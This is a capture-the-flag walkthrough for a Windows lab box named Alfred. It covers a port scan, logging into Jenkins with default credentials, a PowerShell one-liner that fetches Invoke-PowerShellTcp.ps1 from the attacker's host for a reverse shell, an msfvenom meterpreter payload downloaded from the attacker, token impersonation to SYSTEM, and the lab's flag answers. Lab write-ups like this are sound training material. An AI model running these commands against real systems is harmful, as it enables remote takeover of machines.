# ALFRED

## BASIC INFO
```
export IP=10.10.8.255

80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-03T02:33:53+00:00; -40s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```
## INITIAL ACCESS

> - **How man ports are open?**
>> 3

> - **What is the username and password for the log in panel (in the format username:password)**
>> admin:admin\
The login page is located at port 8080

> - **Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature use this command to get th reverse shell on your machine and run it. `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`.**
>> No answer needed

The feature is under view, project, configure tab.

> - **What is the user.txt flag?**
>> 79007a09481963edf2e1321abd9ae2a0

## SWITCHING SHELLS
Creating payload with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.8.177 LPORT=9001 -f exe -o shell.exe
```

> - **What is the final size of the exe payload that you generated?**
>> 70832


```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.8.177:8000/shell.exe','shell.exe')"

Then just run the command
shell
```

## PRIVILEGE ESCALATION

> - **To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?**
>> NT AUTHORITY\SYSTEM

> - **read the root.txt file at C:\Windows\System32\config**
>> dff0f748678f280250f25a45b8046b4a

_**Remember to migrate to spoolsv.exe or services.exe first or else you can't find the flag**_